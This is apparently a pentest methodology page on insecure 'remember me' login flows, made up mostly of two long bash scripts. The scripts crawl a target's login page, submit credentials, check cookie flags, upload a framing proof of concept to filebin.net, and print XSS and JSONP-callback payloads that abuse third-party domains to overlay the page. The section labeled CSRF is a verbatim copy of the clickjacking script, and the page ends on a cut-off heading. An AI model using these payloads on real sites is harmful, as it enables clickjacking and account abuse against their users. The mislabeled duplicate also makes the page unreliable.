# Vulnerable Remember Password

## Check List

* [ ] Validate that the generated session is managed securely and do not put the user’s credentials in danger.

## Methodology

### Black Box

#### Trigger the Passwordless / Remember Me Login

{% stepper %}
{% step %}
Register or log in normally
{% endstep %}

{% step %}
Tick "`Remember me`", "`Stay logged in`", or use "`Sign in with this device`"
{% endstep %}

{% step %}
Complete login → Note you are logged in
{% endstep %}

{% step %}
Open DevTools → Application → Local Storage / Session Storage / IndexedDB
{% endstep %}

{% step %}
Search for `password`, `cred`, `token`, `user`, `email`
{% endstep %}

{% step %}
If `plain/encoded/base64` credentials found → Credential leak confirmed
{% endstep %}

{% step %}
then go to DevTools → Application → Cookies
{% endstep %}

{% step %}
Look for session cookie with no or very long `Expires/Max-Age` (1 year, "Session" but never expires)
{% endstep %}
{% endstepper %}

***

#### Clickjacking on Auto-Login Page

{% stepper %}
{% step %}
Frame the login/auto-auth page

```html
<iframe src="https://target.com/auto-login" style="opacity:0.1"></iframe>
```
{% endstep %}

{% step %}
If auto-login triggers in iframe → Clickjacking Possible
{% endstep %}
{% endstepper %}

***

#### CSRF on Auto-Auth Flow

{% stepper %}
{% step %}
Craft CSRF PoC that visits the auto-login endpoint

```html
<img src="https://target.com/remembered-login-endpoint">
```
{% endstep %}

{% step %}
If victim visits → Automatically logged in as you → CSRF confirmed
{% endstep %}
{% endstepper %}

***

### White Box





## Cheat Sheet

### Click Jacking <a href="#parameter-modification" id="parameter-modification"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [cURL](https://curl.se/)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano rp-clickjacking.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 3 ]; then
    echo "Usage: $0 <domain.com> <username> <password>"
    exit 1
fi

# arguments
URL="$1"
USER="$2"
PASS="$3"
DEPS="git curl golang jq"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        apt install -y "$pkg"
        color_print GREEN "[+] $pkg installed"
    fi
done

# Install Katana
if ! command -v katana &>/dev/null; then
    go env -w GO111MODULE=on
    go env -w GOPROXY=https://goproxy.cn,direct
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
    color_print GREEN "[+] katana installed"
fi

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    color_print RED "[X] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA"; then
    color_print RED "[X] CAPTCHA detected on login page."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Fields
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
    grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
    grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# Remember password / Remember me checkbox
REMEMBER_FIELD=""
REMEMBER_VALUE="on"
REMEMBER_INPUT=$(echo "$FORM" | grep -oiE '<input[^>]+>' | grep -iE 'type=["'\'']?checkbox["'\'']?' | \
    grep -iE 'name=["'\'']?[^"'\'' ]*(remember|remember_me|rememberme|stay_logged|persist|keep[^"'\'']*login)' | head -1)

if [ -n "$REMEMBER_INPUT" ]; then
    REMEMBER_FIELD=$(echo "$REMEMBER_INPUT" | grep -oiE 'name=["'\'']?\K[^"'\'' ]+')
    REMEMBER_VAL_ATTR=$(echo "$REMEMBER_INPUT" | grep -oiE 'value=["'\'']?\K[^"'\'' ]+')
    [ -n "$REMEMBER_VAL_ATTR" ] && REMEMBER_VALUE="$REMEMBER_VAL_ATTR"
fi

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""
HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')

while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=${USER}&${PASSWORD_FIELD}=${PASS}"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
[ -n "$REMEMBER_FIELD" ] && DATA="${DATA}&${REMEMBER_FIELD}=${REMEMBER_VALUE}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers
HEADERS=(
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Check remember-password related vulnerabilities (login + cookies/body)
VULN_FOUND=0
color_print CYAN "[*] Checking remember-password related vulnerabilities..."
tmp_headers=$(mktemp) tmp_body=$(mktemp)
trap "rm -f '$tmp_headers' '$tmp_body'" RETURN
curl -s -S -D "$tmp_headers" -o "$tmp_body" -X "$METHOD" "$FULL_ACTION" "${HEADERS[@]}" --data-raw "$DATA" -L --max-time 15 2>/dev/null || true
login_headers=$(cat "$tmp_headers" 2>/dev/null)
login_response=$(cat "$tmp_body" 2>/dev/null)

login_user=""
while IFS= read -r pair; do
    [[ "$pair" != "${USERNAME_FIELD}="* ]] && continue
    login_user="${pair#*=}"
    break
done <<< "$(echo "$DATA" | tr '&' '\n')"
[[ -z "$login_user" ]] && login_user="admin"

while IFS= read -r line; do
    [[ -z "$line" ]] && continue
    cookie_name=$(echo "$line" | sed -E 's/^Set-Cookie:[[:space:]]*([^=]+)=.*/\1/I' | tr -d ' ')
    if ! echo "$cookie_name" | grep -qiE '^(remember|persist|stay|autologin|keep|auth|session|sess|credential|login_token|access_token)'; then
        echo "$cookie_name" | grep -qiE 'remember|persist|auth|session|sess|credential|token' || continue
    fi
    if echo "$line" | grep -qE 'Max-Age=[0-9]+'; then
        max_age=$(echo "$line" | grep -oE 'Max-Age=[0-9]+' | head -1 | cut -d= -f2)
        if [[ -n "$max_age" && "$max_age" -ge 2592000 ]]; then
            color_print YELLOW "[!] Long-lived cookie (>=30d): $cookie_name"
            VULN_FOUND=1
        fi
    fi
    if echo "$line" | grep -qE 'Expires=[A-Za-z]{3},'; then
        color_print YELLOW "[!] Cookie with Expires (possible long-lived): $cookie_name"
        VULN_FOUND=1
    fi
    echo "$line" | grep -qi 'HttpOnly' || { color_print YELLOW "[!] Auth cookie without HttpOnly: $cookie_name"; VULN_FOUND=1; }
    if [[ "$URL" == https* ]]; then
        echo "$line" | grep -qi 'Secure' || { color_print YELLOW "[!] Auth cookie without Secure (HTTPS): $cookie_name"; VULN_FOUND=1; }
    fi
done <<< "$(echo "$login_headers" | grep -i '^Set-Cookie:')"

if [[ -n "$REMEMBER_FIELD" ]] && echo "$login_headers" | grep -qi '^Set-Cookie:'; then
    color_print YELLOW "[!] Remember-me was sent; response sets cookie(s)."
    VULN_FOUND=1
fi

echo "$login_response" | grep -qiE "remember_me|rememberme|persist|stay_logged|keep.?me.?logged" && \
    { color_print YELLOW "[!] Remember-me token reflected in body (XSS risk)."; VULN_FOUND=1; }
if [[ -n "$login_user" ]]; then
    esc_user=$(printf '%s' "$login_user" | sed 's/[.[\*^$()+?{|]/\\&/g')
    echo "$login_response" | grep -qE "(token|user|id|name).*$esc_user|$esc_user.*(token|user|id)" 2>/dev/null && \
        { color_print YELLOW "[!] Username/token reflected in body (XSS risk)."; VULN_FOUND=1; }
fi

if [[ "$VULN_FOUND" -eq 0 ]]; then
    color_print RED "[X] No remember-password vulnerability detected."
    exit 1
fi

color_print GREEN "[+] Remember-password issue(s) found. Building PoC."

# Build and upload PoC (exploit)
login_escaped="${LOGIN//\\/\\\\}"
login_escaped="${login_escaped//\"/\\\"}"
cat <<EOHTML > /tmp/index.html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, user-scalable=no">
<title></title>
<style>
* { box-sizing: border-box; }
html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; min-height: 100vh; min-height: 100dvh; }
iframe { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; width: 100%; height: 100%; border: none; }
</style>
</head>
<body>
<iframe src="$login_escaped" id="target-frame"></iframe>
</body>
</html>
EOHTML

if [[ -f /tmp/index.html ]]; then
    color_print CYAN "[*] Getting Filebin bin_id..."
    bin_id=$(curl -sL https://filebin.net | grep -oP 'href="https://filebin\.net/\K[^"]+' | head -1)
    if [[ -n "$bin_id" ]]; then
        color_print CYAN "[*] Uploading PoC: ${bin_id}/index.html"
        curl -sL -X POST "https://filebin.net/${bin_id}/index.html" \
            -H "Content-Type: text/html" --data-binary "@/tmp/index.html" >/dev/null
        POC_URL="https://filebin.net/${bin_id}/index.html"
        export POC_URL
        color_print GREEN "[+] PoC uploaded: $POC_URL"
    else
        color_print RED "[X] Could not get Filebin bin_id."
    fi
fi

color_print CYAN "[*] XSS payload: full-screen iframe of login (inject where XSS exists):"
login_js_escaped="${LOGIN//\'/\\\'}"
printf "%b%s%b\n" "${YELLOW}" "(function(){var i=document.createElement('iframe');i.src='${login_js_escaped}';i.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647';document.body.appendChild(i);})();" "${RESET}"
printf "%b%s%b\n\n" "${YELLOW}" "<script>(function(){var i=document.createElement('iframe');i.src='${login_js_escaped}';i.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647';document.body.appendChild(i);})();</script>" "${RESET}"

color_print CYAN "[*] XSS/JSONP payloads to load PoC page (opacity overlay):"
js_payload="var iframe=document.createElement('iframe');iframe.src='${POC_URL}';iframe.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;opacity:0.2;z-index:9999';document.body.appendChild(iframe);"
encoded=$(printf '%s' "$js_payload" | jq -sRr @uri)
targets=(
    "https://api.mixpanel.com/track/?callback=JSONP"
    "https://www.google.com/complete/search?client=chrome&q=hello&callback=JSONP"
    "https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=JSONP"
    "https://accounts.google.com/o/oauth2/revoke?callback=JSONP"
    "https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=JSONP"
    "https://api.vk.com/method/wall.get?callback=JSONP"
    "https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=JSONP"
    "https://ug.alibaba.com/api/ship/read?callback=JSONP"
)

for target in "${targets[@]}"; do
    printf "%b[*] Payload (iframe loader):%b\n" "${YELLOW}" "${RESET}"
    printf "<script src=\"%s\"></script>\n\n" "${target/JSONP/$encoded}"
done

color_print GREEN "[+] Done. PoC: $POC_URL"
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x rp-clickjacking.sh;sudo ./rp-clickjacking.sh $WEBSITE $USER $PASS
```

### Cross Site Request Forgery <a href="#parameter-modification" id="parameter-modification"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [cURL](https://curl.se/)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano rp-csrf.sh
```

```
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 3 ]; then
    echo "Usage: $0 <domain.com> <username> <password>"
    exit 1
fi

# arguments
URL="$1"
USER="$2"
PASS="$3"
DEPS="git curl golang jq"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        apt install -y "$pkg"
        color_print GREEN "[+] $pkg installed"
    fi
done

# Install Katana
if ! command -v katana &>/dev/null; then
    go env -w GO111MODULE=on
    go env -w GOPROXY=https://goproxy.cn,direct
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
    color_print GREEN "[+] katana installed"
fi

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    color_print RED "[X] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA"; then
    color_print RED "[X] CAPTCHA detected on login page."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Fields
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
    grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
    grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# Remember password / Remember me checkbox
REMEMBER_FIELD=""
REMEMBER_VALUE="on"
REMEMBER_INPUT=$(echo "$FORM" | grep -oiE '<input[^>]+>' | grep -iE 'type=["'\'']?checkbox["'\'']?' | \
    grep -iE 'name=["'\'']?[^"'\'' ]*(remember|remember_me|rememberme|stay_logged|persist|keep[^"'\'']*login)' | head -1)

if [ -n "$REMEMBER_INPUT" ]; then
    REMEMBER_FIELD=$(echo "$REMEMBER_INPUT" | grep -oiE 'name=["'\'']?\K[^"'\'' ]+')
    REMEMBER_VAL_ATTR=$(echo "$REMEMBER_INPUT" | grep -oiE 'value=["'\'']?\K[^"'\'' ]+')
    [ -n "$REMEMBER_VAL_ATTR" ] && REMEMBER_VALUE="$REMEMBER_VAL_ATTR"
fi

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""
HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')

while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=${USER}&${PASSWORD_FIELD}=${PASS}"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
[ -n "$REMEMBER_FIELD" ] && DATA="${DATA}&${REMEMBER_FIELD}=${REMEMBER_VALUE}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers
HEADERS=(
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Check remember-password related vulnerabilities (login + cookies/body)
VULN_FOUND=0
color_print CYAN "[*] Checking remember-password related vulnerabilities..."
tmp_headers=$(mktemp) tmp_body=$(mktemp)
trap "rm -f '$tmp_headers' '$tmp_body'" RETURN
curl -s -S -D "$tmp_headers" -o "$tmp_body" -X "$METHOD" "$FULL_ACTION" "${HEADERS[@]}" --data-raw "$DATA" -L --max-time 15 2>/dev/null || true
login_headers=$(cat "$tmp_headers" 2>/dev/null)
login_response=$(cat "$tmp_body" 2>/dev/null)

login_user=""
while IFS= read -r pair; do
    [[ "$pair" != "${USERNAME_FIELD}="* ]] && continue
    login_user="${pair#*=}"
    break
done <<< "$(echo "$DATA" | tr '&' '\n')"
[[ -z "$login_user" ]] && login_user="admin"

while IFS= read -r line; do
    [[ -z "$line" ]] && continue
    cookie_name=$(echo "$line" | sed -E 's/^Set-Cookie:[[:space:]]*([^=]+)=.*/\1/I' | tr -d ' ')
    if ! echo "$cookie_name" | grep -qiE '^(remember|persist|stay|autologin|keep|auth|session|sess|credential|login_token|access_token)'; then
        echo "$cookie_name" | grep -qiE 'remember|persist|auth|session|sess|credential|token' || continue
    fi
    if echo "$line" | grep -qE 'Max-Age=[0-9]+'; then
        max_age=$(echo "$line" | grep -oE 'Max-Age=[0-9]+' | head -1 | cut -d= -f2)
        if [[ -n "$max_age" && "$max_age" -ge 2592000 ]]; then
            color_print YELLOW "[!] Long-lived cookie (>=30d): $cookie_name"
            VULN_FOUND=1
        fi
    fi
    if echo "$line" | grep -qE 'Expires=[A-Za-z]{3},'; then
        color_print YELLOW "[!] Cookie with Expires (possible long-lived): $cookie_name"
        VULN_FOUND=1
    fi
    echo "$line" | grep -qi 'HttpOnly' || { color_print YELLOW "[!] Auth cookie without HttpOnly: $cookie_name"; VULN_FOUND=1; }
    if [[ "$URL" == https* ]]; then
        echo "$line" | grep -qi 'Secure' || { color_print YELLOW "[!] Auth cookie without Secure (HTTPS): $cookie_name"; VULN_FOUND=1; }
    fi
done <<< "$(echo "$login_headers" | grep -i '^Set-Cookie:')"

if [[ -n "$REMEMBER_FIELD" ]] && echo "$login_headers" | grep -qi '^Set-Cookie:'; then
    color_print YELLOW "[!] Remember-me was sent; response sets cookie(s)."
    VULN_FOUND=1
fi

echo "$login_response" | grep -qiE "remember_me|rememberme|persist|stay_logged|keep.?me.?logged" && \
    { color_print YELLOW "[!] Remember-me token reflected in body (XSS risk)."; VULN_FOUND=1; }
if [[ -n "$login_user" ]]; then
    esc_user=$(printf '%s' "$login_user" | sed 's/[.[\*^$()+?{|]/\\&/g')
    echo "$login_response" | grep -qE "(token|user|id|name).*$esc_user|$esc_user.*(token|user|id)" 2>/dev/null && \
        { color_print YELLOW "[!] Username/token reflected in body (XSS risk)."; VULN_FOUND=1; }
fi

if [[ "$VULN_FOUND" -eq 0 ]]; then
    color_print RED "[X] No remember-password vulnerability detected."
    exit 1
fi

color_print GREEN "[+] Remember-password issue(s) found. Building PoC."

# Build and upload PoC (exploit)
login_escaped="${LOGIN//\\/\\\\}"
login_escaped="${login_escaped//\"/\\\"}"
cat <<EOHTML > /tmp/index.html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, user-scalable=no">
<title></title>
<style>
* { box-sizing: border-box; }
html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; min-height: 100vh; min-height: 100dvh; }
iframe { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; width: 100%; height: 100%; border: none; }
</style>
</head>
<body>
<iframe src="$login_escaped" id="target-frame"></iframe>
</body>
</html>
EOHTML

if [[ -f /tmp/index.html ]]; then
    color_print CYAN "[*] Getting Filebin bin_id..."
    bin_id=$(curl -sL https://filebin.net | grep -oP 'href="https://filebin\.net/\K[^"]+' | head -1)
    if [[ -n "$bin_id" ]]; then
        color_print CYAN "[*] Uploading PoC: ${bin_id}/index.html"
        curl -sL -X POST "https://filebin.net/${bin_id}/index.html" \
            -H "Content-Type: text/html" --data-binary "@/tmp/index.html" >/dev/null
        POC_URL="https://filebin.net/${bin_id}/index.html"
        export POC_URL
        color_print GREEN "[+] PoC uploaded: $POC_URL"
    else
        color_print RED "[X] Could not get Filebin bin_id."
    fi
fi

color_print CYAN "[*] XSS payload: full-screen iframe of login (inject where XSS exists):"
login_js_escaped="${LOGIN//\'/\\\'}"
printf "%b%s%b\n" "${YELLOW}" "(function(){var i=document.createElement('iframe');i.src='${login_js_escaped}';i.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647';document.body.appendChild(i);})();" "${RESET}"
printf "%b%s%b\n\n" "${YELLOW}" "<script>(function(){var i=document.createElement('iframe');i.src='${login_js_escaped}';i.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647';document.body.appendChild(i);})();</script>" "${RESET}"

color_print CYAN "[*] XSS/JSONP payloads to load PoC page (opacity overlay):"
js_payload="var iframe=document.createElement('iframe');iframe.src='${POC_URL}';iframe.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;opacity:0.2;z-index:9999';document.body.appendChild(iframe);"
encoded=$(printf '%s' "$js_payload" | jq -sRr @uri)
targets=(
    "https://api.mixpanel.com/track/?callback=JSONP"
    "https://www.google.com/complete/search?client=chrome&q=hello&callback=JSONP"
    "https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=JSONP"
    "https://accounts.google.com/o/oauth2/revoke?callback=JSONP"
    "https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=JSONP"
    "https://api.vk.com/method/wall.get?callback=JSONP"
    "https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=JSONP"
    "https://ug.alibaba.com/api/ship/read?callback=JSONP"
)

for target in "${targets[@]}"; do
    printf "%b[*] Payload (iframe loader):%b\n" "${YELLOW}" "${RESET}"
    printf "<script src=\"%s\"></script>\n\n" "${target/JSONP/$encoded}"
done

color_print GREEN "[+] Done. PoC: $POC_URL"
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x rp-csrf.sh;sudo ./rp-csrf.sh $WEBSITE $USER $PASS
```

### Click Jacking

#### FFUF & Katana &&#x20;
